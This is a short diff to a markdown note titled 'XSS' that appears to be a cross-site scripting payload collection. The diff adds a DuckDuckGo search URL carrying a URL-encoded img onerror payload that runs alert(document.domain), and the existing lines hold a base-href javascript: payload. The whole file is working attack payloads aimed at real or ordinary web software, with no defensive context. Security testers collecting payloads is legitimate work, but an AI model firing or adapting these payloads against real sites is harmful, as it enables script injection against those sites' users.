@@ -1,6 +1,9 @@
 # XSS
 
 ```js
+https://duckduckgo.com/?q=a&norw=%22%3E%3Cimg+src%3D%2F+onerror%3Dalert(document.domain)%3E&ia=web
+
+
 <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a><a href>haha</a>
 
 
